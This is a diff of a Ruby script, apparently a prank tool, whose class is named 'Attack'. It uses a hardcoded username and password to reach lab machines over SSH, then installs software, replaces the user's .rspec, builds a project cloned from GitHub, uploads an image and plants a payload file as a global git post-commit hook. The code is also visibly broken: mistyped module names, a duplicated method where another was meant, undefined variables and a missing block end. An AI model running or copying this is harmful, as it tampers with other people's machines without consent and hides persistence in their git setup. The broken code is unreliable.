@@ -1,18 +1,3 @@
-# require 'fileutils'
-
-# payloads_path = File.join(File.pwd, "payloads")
-# payload_source_path = File.join(payloads_path, "all-your-base-rb")
-
-# template_path = File.join(ENV["HOME"], ".git-templates")
-# hooks_path = File.join(template_path, "hooks")
-# post_commit_path = File.join(hooks_path, "post-commit")
-
-# FileUtils.makedir_p(hooks_path)
-# FileUtils.cp(payload_source_path, post_commit_path)
-# FileUtils.chmod("a+x", post_commit_path)
-
-# system("git config --global init.templatedir '#{template_path}'")
-
 require 'net/ssh'
 require 'net/scp'
 
@@ -22,24 +7,84 @@ host = 'dbc26.local'
 login = 'apprentice'
 password = 'mvclover'
 
+class Attack
+  def initialize(host, login, password)
+    @host = host
+    @login = login
+    @password = password
+    @home = "#{@home}"
+  end
 
-["dbc11.local", "dbc12.local"].each do |host|
-  Net::SSH.start(host, login, password: password) do |ssh|
-    ssh.exec!("gem install nyan-cat-formatter")
+  def ssh_session
+    Net:SSH.start(@host, @login, password: @password) do |ssh|
+      yield(ssh)
+    end
+  end
+
+  def ssh_session
+    Net:SCP.start(@host, @login, password: @password) do |scp|
+      yield(scp)
+    end
+  end
+
+  def install_nyan
+    ssh_session do |ssh|
+      ssh.exec!("gem install nyan-cat-formatter")
+    end
+  end
+
+  def config_nyan
+    ssh_session do |ssh|
+      ssh.execute!("mv #{@home}/.rspec #{@home}/.rspec.backup-#{DateTime.now}")
+    end
+    scp_session do |scp|
+      scp.upload("payloads/.rspec", "#{@home}/.rspec")
+    end
+  end
+
+  def install_imageleap
+    ssh_session do |ssh|
+      ssh.execute!("git clone https://github.com/daytonn/imageleap.git")
+      ssh.execute!("cd imageleap")
+      ssh.execute!("make")
+      ssh.execute!("make install")
+    end
+  end
+
+  def install_zorak
+    ssh_session do |ssh|
+      ssh.execute!("mkdir #{@home}/.gittack")
+    end
+    scp_session do |scp|
+      scp.upload("payloads/zorak.png", "#{@home}/.gittack/zorak.png")
+    end
+  end
+
+  def configure_githooks
+    ssh_session do |ssh|
+      template_path = ssh.execute!("git config --global init.templatedir")
+      if not template
+        template_path = "#{@home}/.git-templates"
+        ssh.execute!("mkdir #{template_path}")
+        ssh.execute!("mkdir #{template_path}/hooks")
+      end
+      template_path + "/hooks"
+    end
+  end
+
+  def install_githooks(hooks_path)
+    ssh_session do |ssh|
+      ssh.execute!("mv hooks_path/post-commit hooks_path/post-commit.backup-#{DateTime.now}")
+    scp_session do |scp|
+      scp.upload("payloads/all-your-base.rb" "#{hooks_path}/post-commit")
+    end
   end
 end
 
-# Net::SSH.start(host, login, password: password) do |ssh|
-#   ssh.exec("gem install nyan-cat-fomatter") do | channel, success |
-#     if success
-#       Net::SCP.upload!(
-#         host, login,
-#         "payloads/.rspec",
-#         "/Users/apprentice/.rspec",
-#         password: password
-#       )
-#     end
-#   end
-# end
-
-
+attack = Attack.new(host, login, password)
+attack.install_imageleap
+attack.install_zorak
+attack.configure_githooks
+attack.install_githooks
+attack.install_nyan
+attack.config_nyan
